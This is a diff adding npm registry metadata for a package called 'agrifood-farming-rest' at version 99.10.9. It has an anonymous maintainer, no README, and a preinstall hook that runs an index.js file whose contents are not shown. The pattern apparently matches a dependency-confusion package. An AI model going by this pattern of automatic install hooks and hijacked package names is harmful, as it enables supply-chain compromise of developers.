@@ -1,0 +1,62 @@
+{
+    "_id": "agrifood-farming-rest",
+    "name": "agrifood-farming-rest",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "agrifood-farming-rest",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "agrifood-farming-rest@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-tm2I6wlS8GvtTsxTPKUojMmDVIqeWWUwTmTfOWQqO0tmfUosRMWjUbbdAGP5YMYKFnGBWVfnpXAG9Nvj5wM5kA==",
+                "shasum": "68c2ff46456324d3bf56f361ece963392bf04bcc",
+                "tarball": "https://registry.npmjs.org/agrifood-farming-rest/-/agrifood-farming-rest-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPIPjACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoxNhAAoAskIN3Reb3XDTaRDj6+BZwXO6cCw0x1wrb6JeEXBMlIU3LL\r\n3ZbbTmtHrnb5pLVCQREHRfTJ1DTTaNR+3UdjFoigj16m0bNPotUcwJgXfAwV\r\nYj3Ozp3apP9GEGkknEdHLICcKfQkB8+c3uqXnMgNOnG2URBCtv1Rws+sqWCS\r\np2IMap1UtXzg+j1Cj/iS3XSbYaTN0dZF5J+YgNZa49sQhys8Y5r+Zyp6Dx/6\r\nsBDtI8IPax4O3+FvMpCPQnYFN2YECGHaFKsQOSsxXB9azKymvXzEZ2P2Btva\r\nPWh3FecWkbq93J9kH3U7ZZKt2Rs8M+7HmhDhtHkBIekMkpV/HAQiUWYd11xU\r\nfqLDOO5UbrZz5DHlYZk3E4WqwA8kvjQ8andp1pBSWDtM9+fuKp1lrAtYgFMR\r\nrHjgj2Yfyxz+VxGlfhGWoiP0ZixCgBpaTgyGhqSwqljvlTSUCe28s5ul/Crw\r\nxdvEUL0Hx/wXlYtMSYY7S8woFnYpRMAZK1bQSysEpzRReQA5lNhACpWkFMDQ\r\n2sP/CcNjSGbWWS8QCOgN5ribQ5zza2INzPVX9vMxfHUYG9DVEOy8Cmf6tBPS\r\niLjvYVeH/xbOj9sNXyKjLFdu2mihKXHnNDFPwVO9oZ4myemVE+2rW9xo1uHX\r\nvoDv59AioxfgBkQ9yJzzA9iA6uPgNEJ6fHk=\r\n=V3PH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "fvtjgl8v",
+                "email": "fvtjgl8v@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "fvtjgl8v",
+                    "email": "fvtjgl8v@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/agrifood-farming-rest_99.10.9_1648133091541_0.6242279194194937"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T14:44:51.540Z",
+        "99.10.9": "2022-03-24T14:44:51.684Z",
+        "modified": "2022-03-24T14:44:51.796Z"
+    },
+    "maintainers": [
+        {
+            "name": "fvtjgl8v",
+            "email": "fvtjgl8v@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
